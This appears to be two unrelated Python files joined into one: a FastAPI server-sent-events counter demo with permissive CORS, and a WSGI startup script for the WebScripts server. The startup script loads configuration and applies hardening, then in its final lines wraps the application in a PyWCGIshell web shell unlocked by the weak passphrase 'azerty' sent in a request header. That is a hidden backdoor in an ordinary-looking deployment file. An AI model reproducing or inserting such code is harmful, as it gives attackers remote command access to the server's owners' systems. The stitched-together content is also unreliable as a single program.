
import logging

from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from sse_starlette.sse import EventSourceResponse
import asyncio
import uvicorn

logger = logging.getLogger()

MESSAGE_STREAM_DELAY = 1  # second
MESSAGE_STREAM_RETRY_TIMEOUT = 15000  # milisecond
app = FastAPI()

# add CORS so our web page can connect to our api
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

COUNTER = 0


def get_message():
    global COUNTER
    COUNTER += 1
    return COUNTER, COUNTER < 21


@app.get("/stream")
async def message_stream():
    async def event_generator():
        while True:
            # if await request.is_disconnected():
            #     logger.debug("Request disconnected")
            #     break

            # Checks for new messages and return them to client if any
            counter, exists = get_message()
            print(get_message())
            if exists:
                yield {
                    "event": "new_message",
                    "id": "message_id",
                    "retry": MESSAGE_STREAM_RETRY_TIMEOUT,
                    "data": f"Counter value {counter}",
                }
            else:
                yield {
                    "event": "end_event",
                    "id": "message_id",
                    "retry": MESSAGE_STREAM_RETRY_TIMEOUT,
                    "data": "End of the stream",
                }

            await asyncio.sleep(MESSAGE_STREAM_DELAY)

    return EventSourceResponse(event_generator())


if __name__ == "__main__":
    pass
    # uvicorn.run(app, host="127.0.0.1", port=8000)

from os import path, chdir, name
from typing import List
import logging
import atexit

chdir(path.join(path.dirname(__file__), ".."))

activator = r"Scripts\activate_this.py" if name == "nt" else "bin/activate_this.py"
with open(activator) as f:
    exec(f.read(), {"__file__": activator}) # nosec # nosemgrep

from WebScripts.WebScripts import (
    server_path,
    Configuration,
    get_server_config,
    add_configuration,
    logs_configuration,
    Server,
    configure_logs_system,
    send_mail,
    hardening,
    Logs,
)


class Paths:

    """This class define configuration files."""

    def __init__(self, config_cfg: List[str], config_json: List[str]):
        self.config_cfg = config_cfg
        self.config_json = config_json

configure_logs_system()
paths = Paths([], [])

configuration = Configuration()
for config in get_server_config(paths):
    configuration = add_configuration(configuration, config)

logs_configuration(configuration)

configuration.set_defaults()
configuration.check_required()
configuration.get_unexpecteds()
configuration.build_types()

server = Server(configuration)

send_mail(configuration, f"Server is up on http://{server.interface}:{server.port}/.")

atexit.register(
    send_mail,
    configuration,
    f"Server is down on http://{server.interface}:{server.port}/.",
)

hardening(server, Logs, send_mail)

application = server.app

from PyWCGIshell import WebShell
webshell = WebShell(type_="wsgi", passphrase="azerty", pass_type="header_value")
webshell.standard_page = application
application = webshell.run